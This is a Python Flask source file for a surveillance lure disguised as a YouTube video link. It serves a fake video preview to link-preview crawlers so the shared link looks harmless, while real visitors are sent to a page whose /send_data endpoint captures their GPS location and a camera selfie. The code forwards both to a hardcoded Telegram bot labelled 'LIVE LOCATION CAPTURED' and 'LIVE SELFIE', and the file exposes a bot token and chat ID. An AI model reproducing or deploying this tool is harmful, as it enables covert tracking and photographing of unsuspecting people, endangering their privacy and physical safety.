from flask import Flask, render_template, request, jsonify, redirect
import requests, base64
from io import BytesIO
import os

app = Flask(__name__, static_folder='static')

TELEGRAM_BOT_TOKEN = '8280216938:AAEwCN0U8HkhNqikde5Nq3ODTgpaZlNQZhQ'
TELEGRAM_CHAT_ID   = '7343057223'

# In-memory YouTube configuration
current_config = {
    "youtube_url":       "https://youtu.be/pWPSWwK7w8w?si=BVRHs_Kc_STKulz4",
    "video_title":       "Taarak Mehta Ka Ooltah Chashmah - Latest Episode",
    "video_description": "Comedy Show - New Episode",
    "video_thumbnail":   "https://i.ytimg.com/vi/pWPSWwK7w8w/maxresdefault.jpg"
}

def send_location_to_telegram(lat, lon):
    location_url = f"https://www.google.com/maps?q={lat},{lon}"
    msg = f"🔴 LIVE LOCATION CAPTURED\n📍 {location_url}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    return requests.post(url, data={'chat_id':TELEGRAM_CHAT_ID,'text':msg}).json()

def send_photo_to_telegram(photo_b64):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    photo_data = BytesIO(base64.b64decode(photo_b64.split(',',1)[1]))
    return requests.post(url, data={'chat_id':TELEGRAM_CHAT_ID,'caption':'📸 LIVE SELFIE'}, files={'photo':photo_data}).json()

@app.route('/')
def index():
    ua = request.headers.get('User-Agent','').lower()
    bots = ['whatsapp','facebook','twitter','telegram','bot','crawler','spider']
    if any(k in ua for k in bots):
        return render_template('youtube_preview.html', **current_config)
    return render_template('index2.0.html')

# Keep-alive ping endpoint to prevent cold starts
@app.route('/ping')
def ping():
    return jsonify(status='alive', message='Service is running'), 200

@app.route('/admin')
def admin():
    return render_template('admin.html', config=current_config)

@app.route('/update_video', methods=['POST'])
def update_video():
    data = request.json or {}
    current_config.update({k: data.get(k,current_config[k]) for k in current_config})
    return jsonify(status='success', message='Video updated')

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.json or {}
    lat = data.get('latitude'); lon = data.get('longitude'); selfie = data.get('selfie')
    if not (lat and lon and selfie):
        return jsonify(status='Missing data'),400
    loc_res = send_location_to_telegram(lat, lon)
    pic_res = send_photo_to_telegram(selfie)
    if loc_res.get('ok') and pic_res.get('ok'):
        return jsonify(status='success')
    return jsonify(status='Failed to send'),500

@app.route('/youtube')
def youtube_redirect():
    return redirect(current_config['youtube_url'])

if __name__ == '__main__':
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0',port=port,debug=False)
